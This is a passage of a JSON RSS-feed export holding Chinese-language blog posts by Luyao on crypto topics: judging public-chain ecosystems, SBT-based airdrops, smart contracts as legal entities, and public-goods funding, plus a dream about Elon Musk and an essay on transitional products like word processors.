href=\"https://book.douban.com/subject/33424487/\"   target=\"_blank\" >时间的秩序</a> 👍</p>\n</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/books2022/",
          "creator": "Luyao",
          "pubDate": "Sun, 01 Jan 2023 15:00:46 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c720e4a553c568297726a1c1b06c28b9",
          "highlights": []
        },
        {
          "title": "一个判断公链的简单指标",
          "description": "<p>一个公链生态好不好，取决于上面的 App；而 App 好不好，取决于上面开发者的质量。而开发者的质量，我有个很简单的指标来判断，那就是：</p>\n<blockquote>\n<p>看这个生态里，<strong>有多少原创、有趣、但不赚钱的 App。</strong></p>\n</blockquote>\n<p>赚钱的 App 当然谁都愿意做，方法多得是，随便 fork 一个项目就可以赚钱。但不赚钱的 App，至少说明在你的价值观里，有一些东西比钱重要。</p>\n<p>原创、有趣，则说明了开发者的能力，牛逼的开发者喜欢捣鼓新东西、捣鼓有趣的东西。那种靠山寨捞钱的事情，好的开发者通常不干。</p>\n<p>所以，你看如果一个生态里，如果有很多原创、有趣、不赚钱的 App，你就知道，这里活跃着一群有能力、有热情、价值观一致的开发者们。</p>\n<p>反之亦然，如果一个生态里都是 fork 的、捞钱的 App，你就知道这里汇集了二流开发者，且他们的价值观也不利于创造。</p>\n<p>===</p>\n<p><em>P.S. 一些后续</em></p>\n<p><em>当我跟朋友聊起这个，刚说到原创有趣、但不赚钱，我朋友马上就说：</em></p>\n<p><em>&gt; “呀，那不就是 xdai 吗？”</em></p>\n<p><em>我说：“对对对，我第一反应也是这个！”</em> 😂</p>\n<p><em>(xdai 现在叫 Gnosis Chain，上面有很多很穷的原创项目，比如 <a href=\"https://poap.fun\"   target=\"_blank\" >POAP</a>，比如知名ZK游戏 <a href=\"https://zkga.me\"   target=\"_blank\" >DarkForest</a>，这个游戏很棒但不赚钱，团队里三个人要靠 Gnosis 的救济来工作，笑死，他们团队前一阵发了个 <a href=\"https://forum.gnosis.io/t/gip-55-should-gnosisdao-fund-dark-forest-dao-for-arena-game-mode-on-gnosis-optimism/5386\"   target=\"_blank\" >GIP55 提案</a>，请求 Gnosis 社区拨款 15.9 万块来支持他们工作，真是太好笑了。)</em></p>\n",
          "content": "<p>一个公链生态好不好，取决于上面的 App；而 App 好不好，取决于上面开发者的质量。而开发者的质量，我有个很简单的指标来判断，那就是：</p>\n<blockquote>\n<p>看这个生态里，<strong>有多少原创、有趣、但不赚钱的 App。</strong></p>\n</blockquote>\n<p>赚钱的 App 当然谁都愿意做，方法多得是，随便 fork 一个项目就可以赚钱。但不赚钱的 App，至少说明在你的价值观里，有一些东西比钱重要。</p>\n<p>原创、有趣，则说明了开发者的能力，牛逼的开发者喜欢捣鼓新东西、捣鼓有趣的东西。那种靠山寨捞钱的事情，好的开发者通常不干。</p>\n<p>所以，你看如果一个生态里，如果有很多原创、有趣、不赚钱的 App，你就知道，这里活跃着一群有能力、有热情、价值观一致的开发者们。</p>\n<p>反之亦然，如果一个生态里都是 fork 的、捞钱的 App，你就知道这里汇集了二流开发者，且他们的价值观也不利于创造。</p>\n<p>===</p>\n<p><em>P.S. 一些后续</em></p>\n<p><em>当我跟朋友聊起这个，刚说到原创有趣、但不赚钱，我朋友马上就说：</em></p>\n<p><em>&gt; “呀，那不就是 xdai 吗？”</em></p>\n<p><em>我说：“对对对，我第一反应也是这个！”</em> 😂</p>\n<p><em>(xdai 现在叫 Gnosis Chain，上面有很多很穷的原创项目，比如 <a href=\"https://poap.fun\"   target=\"_blank\" >POAP</a>，比如知名ZK游戏 <a href=\"https://zkga.me\"   target=\"_blank\" >DarkForest</a>，这个游戏很棒但不赚钱，团队里三个人要靠 Gnosis 的救济来工作，笑死，他们团队前一阵发了个 <a href=\"https://forum.gnosis.io/t/gip-55-should-gnosisdao-fund-dark-forest-dao-for-arena-game-mode-on-gnosis-optimism/5386\"   target=\"_blank\" >GIP55 提案</a>，请求 Gnosis 社区拨款 15.9 万块来支持他们工作，真是太好笑了。)</em></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/gooddevs/",
          "creator": "Luyao",
          "pubDate": "Wed, 03 Aug 2022 23:57:53 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "08d122a40949a9ac6f599437e5b12eee",
          "highlights": []
        },
        {
          "title": "下一代的空投",
          "description": "<h3 id=\"1\">1</h3>\n<p>上半年我获得了 <a href=\"https://cow.fi\"   target=\"_blank\" >COW</a> / <a href=\"https://hop.exchange\"   target=\"_blank\" >HOP</a> / <a href=\"https://www.optimism.io\"   target=\"_blank\" >OP</a> 三个项目的空投，有意思的是，这几个空投都遇到了一个相同的现象：<strong>羊毛党极不满意</strong>。</p>\n<p>中文频道往往是羊毛党重灾区，空投前总是骂声一片，比如你常能看到这种：</p>\n<p>“我刷了 50 个地址，花了那么多 gas 费，你们项目居然就给这么点币，骗子项目！”</p>\n<p>或是这种：</p>\n<p>“我带领社群两百人过来撸毛，你最后却不发给我们，这种项目，死了算了！”</p>\n<p>我的内心反应通常是：WTF is wrong with you?</p>\n<h3 id=\"2\">2</h3>\n<p>大部分人都不理解项目为什么要空投，奖励用户？回馈社区？都不是。去年 ENS 的 Brantly 在<a href=\"https://youtu.be/jwadHC5ha-E?t=2832\"   target=\"_blank\" >访谈</a>中说了这么一句话：</p>\n<p><strong>“我们不是在奖励用户，也不是在回馈社区，我们根本不关心那些。我们只是在实行去中心化的治理，所以我们要把投票权交到合适的人手上。”</strong></p>\n<p>理解了吗，空投本质上是一个社区组建行为，就跟公司选董事会一样。你不希望一帮笨蛋把你的项目带偏，你就得把票交到你认可的人手里。</p>\n<p>从这个角度来说，羊毛党是项目方最不愿意空投的人。<strong>排除羊毛党应该是以后每一个项目方都会遇到的问题</strong>。</p>\n<h3 id=\"3\">3</h3>\n<p>我怀疑 SBT 的一个主要场景，就是发空投。</p>\n<p>你看最近的几个空投，他们都是一大堆条件，每个条件带一些权重（有没有为某些项目 voting 过，有没有参与过 xx，有没有持有 xx），这个实际上已经变相就是一个个 SBT 了。</p>\n<p>以 OP 为例，它的若干条件如下：</p>\n<p><img src=\"https://zhangluyao.com/images/next-gen-airdrop/op-airdrop.jpg\" alt=\"\"></p>\n<p>参与过 DAO 治理、使用过多签钱包、给 Gitcoin 捐过钱，听起来，<strong>这不就是一个个 SBT 吗？</strong></p>\n<p>所以其实 OP 已经在使用 SBT 来分配空投了，只是这是个团队自己整理的“手动自制版 SBT”，不是真正的 SBT。</p>\n<p>我估计以后 SBT 普及了，会有更多项目基于 SBT 来空投。</p>\n<p>我举个例子，</p>\n<ul>\n<li>\n<p>某个协议发了 30 个 SBT，是该协议最早的 30 个贡献者；</p>\n</li>\n<li>\n<p>Stanford 给 2023 届毕业生每个人发了个 SBT 毕业证书；</p>\n</li>\n<li>\n<p>EthCC 给每个参会者都发了个 SBT</p>\n</li>\n</ul>\n<p>假如我一看，你有这三个 SBT。</p>\n<p>那你肯定不是羊毛党，而且我还会给你个很高的权重，我希望你在我们社区。</p>\n<p>这些 SBT 不一定需要你多少成本，但可以看出来你是个什么样的人。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/SPR6Mos1JBKtzFALpSNY2QdIDbjbFPzQvNd0YcqiuUk\"   target=\"_blank\" >预言家周报#182期</a>）</p>\n",
          "content": "<h3 id=\"1\">1</h3>\n<p>上半年我获得了 <a href=\"https://cow.fi\"   target=\"_blank\" >COW</a> / <a href=\"https://hop.exchange\"   target=\"_blank\" >HOP</a> / <a href=\"https://www.optimism.io\"   target=\"_blank\" >OP</a> 三个项目的空投，有意思的是，这几个空投都遇到了一个相同的现象：<strong>羊毛党极不满意</strong>。</p>\n<p>中文频道往往是羊毛党重灾区，空投前总是骂声一片，比如你常能看到这种：</p>\n<p>“我刷了 50 个地址，花了那么多 gas 费，你们项目居然就给这么点币，骗子项目！”</p>\n<p>或是这种：</p>\n<p>“我带领社群两百人过来撸毛，你最后却不发给我们，这种项目，死了算了！”</p>\n<p>我的内心反应通常是：WTF is wrong with you?</p>\n<h3 id=\"2\">2</h3>\n<p>大部分人都不理解项目为什么要空投，奖励用户？回馈社区？都不是。去年 ENS 的 Brantly 在<a href=\"https://youtu.be/jwadHC5ha-E?t=2832\"   target=\"_blank\" >访谈</a>中说了这么一句话：</p>\n<p><strong>“我们不是在奖励用户，也不是在回馈社区，我们根本不关心那些。我们只是在实行去中心化的治理，所以我们要把投票权交到合适的人手上。”</strong></p>\n<p>理解了吗，空投本质上是一个社区组建行为，就跟公司选董事会一样。你不希望一帮笨蛋把你的项目带偏，你就得把票交到你认可的人手里。</p>\n<p>从这个角度来说，羊毛党是项目方最不愿意空投的人。<strong>排除羊毛党应该是以后每一个项目方都会遇到的问题</strong>。</p>\n<h3 id=\"3\">3</h3>\n<p>我怀疑 SBT 的一个主要场景，就是发空投。</p>\n<p>你看最近的几个空投，他们都是一大堆条件，每个条件带一些权重（有没有为某些项目 voting 过，有没有参与过 xx，有没有持有 xx），这个实际上已经变相就是一个个 SBT 了。</p>\n<p>以 OP 为例，它的若干条件如下：</p>\n<p><img src=\"https://zhangluyao.com/images/next-gen-airdrop/op-airdrop.jpg\" alt=\"\"></p>\n<p>参与过 DAO 治理、使用过多签钱包、给 Gitcoin 捐过钱，听起来，<strong>这不就是一个个 SBT 吗？</strong></p>\n<p>所以其实 OP 已经在使用 SBT 来分配空投了，只是这是个团队自己整理的“手动自制版 SBT”，不是真正的 SBT。</p>\n<p>我估计以后 SBT 普及了，会有更多项目基于 SBT 来空投。</p>\n<p>我举个例子，</p>\n<ul>\n<li>\n<p>某个协议发了 30 个 SBT，是该协议最早的 30 个贡献者；</p>\n</li>\n<li>\n<p>Stanford 给 2023 届毕业生每个人发了个 SBT 毕业证书；</p>\n</li>\n<li>\n<p>EthCC 给每个参会者都发了个 SBT</p>\n</li>\n</ul>\n<p>假如我一看，你有这三个 SBT。</p>\n<p>那你肯定不是羊毛党，而且我还会给你个很高的权重，我希望你在我们社区。</p>\n<p>这些 SBT 不一定需要你多少成本，但可以看出来你是个什么样的人。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/SPR6Mos1JBKtzFALpSNY2QdIDbjbFPzQvNd0YcqiuUk\"   target=\"_blank\" >预言家周报#182期</a>）</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/next-gen-airdrop/",
          "creator": "Luyao",
          "pubDate": "Mon, 01 Aug 2022 11:46:38 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "e37caed1a7abe0896fa16fed7d744b67",
          "highlights": []
        },
        {
          "title": "如果孙中山是一个智能合约",
          "description": "<p>这几周老是接到各种商标代理的电话骚扰，说我之前的一个商标被提起了撤销，要我赶紧付钱请他们答辩。这让我想到一个非常有趣的问题：</p>\n<p>如果是在链上，会发生什么呢？</p>\n<p>比如说你部署了个叫 Uniswap 的合约，贼流行，用的人很多。然后突然有人站出来说:</p>\n<blockquote>\n<p>不行，Uniswap 是我们五年前就注册的商标，你不能用。</p>\n</blockquote>\n<p>搞笑的地方就是，你奈我何呢，甚至于，<strong>我自己也没办法</strong>，难道我让以太坊回滚、fork吗？</p>\n<p>以前传统的世界里，一切事物背后都有一个实体，我总能找到你的公司、公司的法人、公司的服务器机房，它们都受到约束，我可以罚你的款、抓你的人、关你的机器。</p>\n<p><strong>区块链头一次创造了一种，一个东西在运行，但找不到它背后的实体的状况</strong>。零成本运行，无法被修改，也无法被关闭，这使得它实际上不受法律约束。</p>\n<p>比如，你创造了一个叫做 Disney 的合约，大家都爱用。而 Disney 公司最喜欢发律师函了，可是这次他要发给谁？他找不到人发。</p>\n<p>再比如，一个合约要是每天都在违法，那法院要怎么判决？取缔这个合约吗，取缔不了；抓人吗，它背后并没有人。</p>\n<p>我前一段时间在读一本讲辛亥革命的书，清朝一直想要刺杀孙中山，拘禁他，找他麻烦。</p>\n<p>你看，他们也就是欺负孙中山是个人类。</p>\n<p><strong>如果孙中山是个合约呢？</strong></p>\n<p>孙中山平时干的那些事儿，主要是募资，还有协调组织人事，合约不是一样能干，而且干得更好。清朝要怎么办？抓谁？不知道，完全束手无策。</p>\n<p>我想<strong>我们整个社会制度，还没有准备好接受一种人类以外的实体</strong>。社会要适应它可能还有一个漫长的过程，这期间大概会出现非常多的冲突、Bug、机遇。</p>\n",
          "content": "<p>这几周老是接到各种商标代理的电话骚扰，说我之前的一个商标被提起了撤销，要我赶紧付钱请他们答辩。这让我想到一个非常有趣的问题：</p>\n<p>如果是在链上，会发生什么呢？</p>\n<p>比如说你部署了个叫 Uniswap 的合约，贼流行，用的人很多。然后突然有人站出来说:</p>\n<blockquote>\n<p>不行，Uniswap 是我们五年前就注册的商标，你不能用。</p>\n</blockquote>\n<p>搞笑的地方就是，你奈我何呢，甚至于，<strong>我自己也没办法</strong>，难道我让以太坊回滚、fork吗？</p>\n<p>以前传统的世界里，一切事物背后都有一个实体，我总能找到你的公司、公司的法人、公司的服务器机房，它们都受到约束，我可以罚你的款、抓你的人、关你的机器。</p>\n<p><strong>区块链头一次创造了一种，一个东西在运行，但找不到它背后的实体的状况</strong>。零成本运行，无法被修改，也无法被关闭，这使得它实际上不受法律约束。</p>\n<p>比如，你创造了一个叫做 Disney 的合约，大家都爱用。而 Disney 公司最喜欢发律师函了，可是这次他要发给谁？他找不到人发。</p>\n<p>再比如，一个合约要是每天都在违法，那法院要怎么判决？取缔这个合约吗，取缔不了；抓人吗，它背后并没有人。</p>\n<p>我前一段时间在读一本讲辛亥革命的书，清朝一直想要刺杀孙中山，拘禁他，找他麻烦。</p>\n<p>你看，他们也就是欺负孙中山是个人类。</p>\n<p><strong>如果孙中山是个合约呢？</strong></p>\n<p>孙中山平时干的那些事儿，主要是募资，还有协调组织人事，合约不是一样能干，而且干得更好。清朝要怎么办？抓谁？不知道，完全束手无策。</p>\n<p>我想<strong>我们整个社会制度，还没有准备好接受一种人类以外的实体</strong>。社会要适应它可能还有一个漫长的过程，这期间大概会出现非常多的冲突、Bug、机遇。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/newentity/",
          "creator": "Luyao",
          "pubDate": "Mon, 25 Jul 2022 15:16:27 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "626162ec638eac75c6ef260d0fd39fb0",
          "highlights": []
        },
        {
          "title": "公共物品小故事四则",
          "description": "<p>‌\nVitalik 经常聊公共物品。</p>\n<p>因为以太坊生态里就有很多公共物品，比如开源客户端、协议研究、文档、社区贡献的库等等，这些东西对每个人都有好处，但不赚钱，所以<strong>怎么帮它们搞到钱</strong>？这是一个很难的问题。</p>\n<p>我听了 Vitalik 过去几年的分享，有几个挺有意思的小故事。</p>\n<h3 id=\"1\">1</h3>\n<p>他说，在维护 “公链安全 “这一公共物品上，问题已经被解决得很好了。矿工们挖矿，得到报酬，同时又维护了公链的安全。那么这个方法能不能推及其他公共物品呢？</p>\n<p>结果还真有。</p>\n<p>ZCash 有一个尝试，就是把每次区块奖励的 20% 自动给到一个 ZCash 基金会地址来支持开发。</p>\n<p>BitcoinCash 也做过类似的尝试，一个软分叉，要把 12.5% 的区块奖励分给开发基金。但遭到社区强烈反对，大家觉得你这个开发基金要怎么治理，还有其他一堆问题。</p>\n<h3 id=\"2\">2</h3>\n<p>在讨论“钱要怎么分配”上，他也讲了个很好玩的东西。</p>\n<p>他有在琢磨，怎么给那些 library 合约找到收入呢？</p>\n<p>于是他想了个办法，鉴于一个合约被调用的次数是可衡量的，那么就可以据此激励它。比如说，对于合约的每笔交易，合约都可以获得 gas fee 的一小部分。</p>\n<p>但是，一旦这么做会有个问题，人们可能会自己 copy 一份代码，放在自己的产品里，自己获得收入。</p>\n<p>针对这个问题，他也提出了一种解决方案，非线性的收益。就是说一个 library 合约，它被调用的次数越多，获得的收益比例也越高，这样的话拷贝一份就无利可图了。</p>\n<p>当然，这只是个想法，实际会遇到另一些问题，比如额外增加了交易的开销。</p>\n<p>P.S. 我和朋友讲起这个故事，他第一反应是 “这倒是挺适合 openzeppelin，开发了这么多好工具，却没赚钱”。我说没错，这就是问题，他们写了很多合约，最后却只能靠审计之类的业务赚钱。像极了内容创作者，做了好内容不赚钱，只能靠带货来赚钱。</p>\n<h3 id=\"3\">3</h3>\n<p>事实上，对于以太坊自身，Vitalik 在 2019 年也曾有过一个很夸张的提案。</p>\n<p>美国给小费有一个约定俗成的比例，Vitalik 觉得没准以太坊也能这么搞。</p>\n<p>于是他提议说，或许可以让每笔交易都捐出 1 gwei 给基金会。他按照当时（2019 年）的价格算了下，每年能获得 200 万美金的收入，能够维持基金会运作。</p>\n<p>这个提案是夸张了点儿，但也引发了大家不少的讨论。</p>\n<h3 id=\"4\">4</h3>\n<p>公共物品募资问题的一个新进展是，去年 Optimism 和 Vitalik 一起提出的 retroactive funding，对我来说挺有启发。</p>\n<p>公共物品募资的问题在于，一个不赚钱的事情需要钱，那么钱从哪里来呢？</p>\n<p>而在区块链里，刚好存在一些反过来的东西，一个东西（比如协议），它是赚钱的，但似乎不知道该把协议赚到的钱给谁，比如 OP 的 sequencer fee。</p>\n<p>这两者恰好可以结合起来，把 “不知道给谁” 的钱，给那些 “不知道钱该从哪来” 的项目。</p>\n<p>OP 的 retroactive funding 是这样一个例子，它的意思是，把 OP 赚到的钱，定期地像评奖一样，分给那些有用的项目。</p>\n<p>目前有一个专门的组织来评这个 “奖”，是一个叫做 the Result Oracle 的 DAO。</p>\n<p>他们的主要观点是，我们不做预测，我们只奖励过去实际创造了价值的东西。</p>\n<p>（巧的是，我最近刚好听了一期两年前的关于疫苗研究的<a href=\"https://www.youtube.com/watch?v=i75KvXVrtLw\"   target=\"_blank\" >访谈</a>，里面也讲到政府不擅长做预测，更好地做法是 “评奖”，评奖在实践中是一种非常有效的激励方法）</p>\n<p>===</p>\n<p>总之呢，公共物品的募资，现在还没有很好的方法。Vitalik 说，<strong>如果你研究出了一个公共物品募资的好方法，那么乌托邦就有希望了</strong>！</p>\n<p>最后话说回来，你看 Vitalik 都在琢磨这些事情，相比之下，有些公链只知道拉盘做社区。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/yl1ec0Yh3gOn9LF7XgVQXYjXkfXmwrVizqDgzlIw4sA\"   target=\"_blank\" >预言家周报#181期</a>）</p>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"https://youtu.be/O0Tca-GV5mk\"   target=\"_blank\" >2020 EthCC Vitalik Buterin: Funding ecosystem public goods</a></li>\n<li><a href=\"https://youtu.be/i_t4VhisO1Y\"   target=\"_blank\" >2021 Vitalik Buterin: Funding public goods — algorithms and mechanisms</a></li>\n<li><a href=\"https://youtu.be/OrrkuUlFfOQ\"   target=\"_blank\" >2021 EthOnline Vitalik Buterin and Karl Floersch: Retroactive Public Goods Funding</a></li>\n<li><a href=\"https://medium.com/ethereum-optimism/retroactive-public-goods-funding-33c9b7d00f0c\"   target=\"_blank\" >2021 Optimism Blog: Retroactive Public Goods Funding</a></li>\n<li><a href=\"https://youtu.be/3_8CPpVaaGA\"   target=\"_blank\" >2022 Bankless: Vitalik Buterin - Green Pill #1</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Public_good_%28economics%29\"   target=\"_blank\" >Wikipedia: Public good</a></li>\n</ol>\n",
          "content": "<p>‌\nVitalik 经常聊公共物品。</p>\n<p>因为以太坊生态里就有很多公共物品，比如开源客户端、协议研究、文档、社区贡献的库等等，这些东西对每个人都有好处，但不赚钱，所以<strong>怎么帮它们搞到钱</strong>？这是一个很难的问题。</p>\n<p>我听了 Vitalik 过去几年的分享，有几个挺有意思的小故事。</p>\n<h3 id=\"1\">1</h3>\n<p>他说，在维护 “公链安全 “这一公共物品上，问题已经被解决得很好了。矿工们挖矿，得到报酬，同时又维护了公链的安全。那么这个方法能不能推及其他公共物品呢？</p>\n<p>结果还真有。</p>\n<p>ZCash 有一个尝试，就是把每次区块奖励的 20% 自动给到一个 ZCash 基金会地址来支持开发。</p>\n<p>BitcoinCash 也做过类似的尝试，一个软分叉，要把 12.5% 的区块奖励分给开发基金。但遭到社区强烈反对，大家觉得你这个开发基金要怎么治理，还有其他一堆问题。</p>\n<h3 id=\"2\">2</h3>\n<p>在讨论“钱要怎么分配”上，他也讲了个很好玩的东西。</p>\n<p>他有在琢磨，怎么给那些 library 合约找到收入呢？</p>\n<p>于是他想了个办法，鉴于一个合约被调用的次数是可衡量的，那么就可以据此激励它。比如说，对于合约的每笔交易，合约都可以获得 gas fee 的一小部分。</p>\n<p>但是，一旦这么做会有个问题，人们可能会自己 copy 一份代码，放在自己的产品里，自己获得收入。</p>\n<p>针对这个问题，他也提出了一种解决方案，非线性的收益。就是说一个 library 合约，它被调用的次数越多，获得的收益比例也越高，这样的话拷贝一份就无利可图了。</p>\n<p>当然，这只是个想法，实际会遇到另一些问题，比如额外增加了交易的开销。</p>\n<p>P.S. 我和朋友讲起这个故事，他第一反应是 “这倒是挺适合 openzeppelin，开发了这么多好工具，却没赚钱”。我说没错，这就是问题，他们写了很多合约，最后却只能靠审计之类的业务赚钱。像极了内容创作者，做了好内容不赚钱，只能靠带货来赚钱。</p>\n<h3 id=\"3\">3</h3>\n<p>事实上，对于以太坊自身，Vitalik 在 2019 年也曾有过一个很夸张的提案。</p>\n<p>美国给小费有一个约定俗成的比例，Vitalik 觉得没准以太坊也能这么搞。</p>\n<p>于是他提议说，或许可以让每笔交易都捐出 1 gwei 给基金会。他按照当时（2019 年）的价格算了下，每年能获得 200 万美金的收入，能够维持基金会运作。</p>\n<p>这个提案是夸张了点儿，但也引发了大家不少的讨论。</p>\n<h3 id=\"4\">4</h3>\n<p>公共物品募资问题的一个新进展是，去年 Optimism 和 Vitalik 一起提出的 retroactive funding，对我来说挺有启发。</p>\n<p>公共物品募资的问题在于，一个不赚钱的事情需要钱，那么钱从哪里来呢？</p>\n<p>而在区块链里，刚好存在一些反过来的东西，一个东西（比如协议），它是赚钱的，但似乎不知道该把协议赚到的钱给谁，比如 OP 的 sequencer fee。</p>\n<p>这两者恰好可以结合起来，把 “不知道给谁” 的钱，给那些 “不知道钱该从哪来” 的项目。</p>\n<p>OP 的 retroactive funding 是这样一个例子，它的意思是，把 OP 赚到的钱，定期地像评奖一样，分给那些有用的项目。</p>\n<p>目前有一个专门的组织来评这个 “奖”，是一个叫做 the Result Oracle 的 DAO。</p>\n<p>他们的主要观点是，我们不做预测，我们只奖励过去实际创造了价值的东西。</p>\n<p>（巧的是，我最近刚好听了一期两年前的关于疫苗研究的<a href=\"https://www.youtube.com/watch?v=i75KvXVrtLw\"   target=\"_blank\" >访谈</a>，里面也讲到政府不擅长做预测，更好地做法是 “评奖”，评奖在实践中是一种非常有效的激励方法）</p>\n<p>===</p>\n<p>总之呢，公共物品的募资，现在还没有很好的方法。Vitalik 说，<strong>如果你研究出了一个公共物品募资的好方法，那么乌托邦就有希望了</strong>！</p>\n<p>最后话说回来，你看 Vitalik 都在琢磨这些事情，相比之下，有些公链只知道拉盘做社区。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/yl1ec0Yh3gOn9LF7XgVQXYjXkfXmwrVizqDgzlIw4sA\"   target=\"_blank\" >预言家周报#181期</a>）</p>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"https://youtu.be/O0Tca-GV5mk\"   target=\"_blank\" >2020 EthCC Vitalik Buterin: Funding ecosystem public goods</a></li>\n<li><a href=\"https://youtu.be/i_t4VhisO1Y\"   target=\"_blank\" >2021 Vitalik Buterin: Funding public goods — algorithms and mechanisms</a></li>\n<li><a href=\"https://youtu.be/OrrkuUlFfOQ\"   target=\"_blank\" >2021 EthOnline Vitalik Buterin and Karl Floersch: Retroactive Public Goods Funding</a></li>\n<li><a href=\"https://medium.com/ethereum-optimism/retroactive-public-goods-funding-33c9b7d00f0c\"   target=\"_blank\" >2021 Optimism Blog: Retroactive Public Goods Funding</a></li>\n<li><a href=\"https://youtu.be/3_8CPpVaaGA\"   target=\"_blank\" >2022 Bankless: Vitalik Buterin - Green Pill #1</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Public_good_%28economics%29\"   target=\"_blank\" >Wikipedia: Public good</a></li>\n</ol>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/publicgoods/",
          "creator": "Luyao",
          "pubDate": "Sat, 23 Jul 2022 18:10:47 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d407630c108d91670b3cec5ee36d25f0",
          "highlights": []
        },
        {
          "title": "梦见 Elon Musk",
          "description": "<p>在一栋大楼里，1 - 5 层是他们公司，他在 1 楼大厅，一张非常小非常破的电脑桌前办公。</p>\n<p>那个办公桌有点像小学时机房的电脑桌，除了鼠标外，记事本也只能放一半，他的记事本是小学生用的那种作业本。</p>\n<p>我说，我没想到你用这么小这么破的桌子。</p>\n<p>他在纸上花了个图，是麦当劳的菜单，有各种鸡块、鸡翅、汉堡，然后问我：你有钱，你会点多少？</p>\n<p>我说，够吃饱就行。</p>\n<p>他说，对，够吃饱就行，所以跟你有多少钱是无关的。</p>\n",
          "content": "<p>在一栋大楼里，1 - 5 层是他们公司，他在 1 楼大厅，一张非常小非常破的电脑桌前办公。</p>\n<p>那个办公桌有点像小学时机房的电脑桌，除了鼠标外，记事本也只能放一半，他的记事本是小学生用的那种作业本。</p>\n<p>我说，我没想到你用这么小这么破的桌子。</p>\n<p>他在纸上花了个图，是麦当劳的菜单，有各种鸡块、鸡翅、汉堡，然后问我：你有钱，你会点多少？</p>\n<p>我说，够吃饱就行。</p>\n<p>他说，对，够吃饱就行，所以跟你有多少钱是无关的。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/dream/",
          "creator": "Luyao",
          "pubDate": "Mon, 18 Apr 2022 12:40:28 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "77efd2ada727ccb43fa554f77e70e241",
          "highlights": []
        },
        {
          "title": "过渡性产品",
          "description": "<p>从打字机到个人电脑之间，有一个过渡产品，叫做 <a href=\"https://en.wikipedia.org/wiki/Word_processor_%28electronic_device%29\"   target=\"_blank\" >文字处理机</a>（word processor machine）。它是一种带了 CPU 和内存的打字机，因而有一些附加功能如存储、编辑，一出现就很受商业用户欢迎。</p>\n<p>70 年代末，苹果和微软刚成立时，恰是文字处理机卖的最火的时候，<a href=\"https://zh.wikipedia.org/wiki/%e7%8e%8b%e5%ae%89%e9%9b%bb%e8%85%a6\"   target=\"_blank\" >王安电脑</a> 作为最大的文字处理机生产商赚了很多钱，一度登上福布斯第五位。相比之下个人电脑在当时简陋得像玩具，功能上要啥没啥，商业用户不屑用这个。</p>\n<p>然而个人电脑的发展太快了。80 年代，大家都来改进它的硬件设计，加上它是一个通用平台，上面涌现了源源不断的软件应用，包括各种文字处理软件，功能上很快就超过了传统的文字处理机。几年后文字处理机就淡出了市场，王安电脑也最终破产。</p>\n<p>这件事情给我两个感悟。</p>\n<p>首先，<strong>一个过渡性的东西，它可能当下很火，但不代表它就是未来</strong>，这在 crypto 这种萌芽期的行业格外常见。</p>\n<p>然后，也是我觉得<strong>最有趣的部分是，像苹果、微软这种后来的老大哥，他们根本没有参与过文字处理机这种过渡产品</strong>。没有来自过去客户的束缚，可以更自由地思考产品，我觉得他们是 computer native 的（我发明的词）。事实上一模一样的事情也发生在电报/电话上，西联公司作为电报巨头，它过于在乎电报客户的看法（无需传递声音），以至于完全错过了规模大得多的电话业务。</p>\n",
          "content": "<p>从打字机到个人电脑之间，有一个过渡产品，叫做 <a href=\"https://en.wikipedia.org/wiki/Word_processor_%28electronic_device%29\"   target=\"_blank\" >文字处理机</a>（word processor machine）。它是一种带了 CPU 和内存的打字机，因而有一些附加功能如存储、编辑，一出现就很受商业用户欢迎。</p>\n<p>70 年代末，苹果和微软刚成立时，恰是文字处理机卖的最火的时候，<a href=\"https://zh.wikipedia.org/wiki/%e7%8e%8b%e5%ae%89%e9%9b%bb%e8%85%a6\"   target=\"_blank\" >王安电脑</a> 作为最大的文字处理机生产商赚了很多钱，一度登上福布斯第五位。相比之下个人电脑在当时简陋得像玩具，功能上要啥没啥，商业用户不屑用这个。</p>\n<p>然而个人电脑的发展太快了。80 年代，大家都来改进它的硬件设计，加上它是一个通用平台，上面涌现了源源不断的软件应用，包括各种文字处理软件，功能上很快就超过了传统的文字处理机。几年后文字处理机就淡出了市场，王安电脑也最终破产。</p>\n<p>这件事情给我两个感悟。</p>\n<p>首先，<strong>一个过渡性的东西，它可能当下很火，但不代表它就是未来</strong>，这在 crypto 这种萌芽期的行业格外常见。</p>\n<p>然后，也是我觉得<strong>最有趣的部分是，像苹果、微软这种后来的老大哥，他们根本没有参与过文字处理机这种过渡产品</strong>。没有来自过去客户的束缚，可以更自由地思考产品，我觉得他们是 computer native 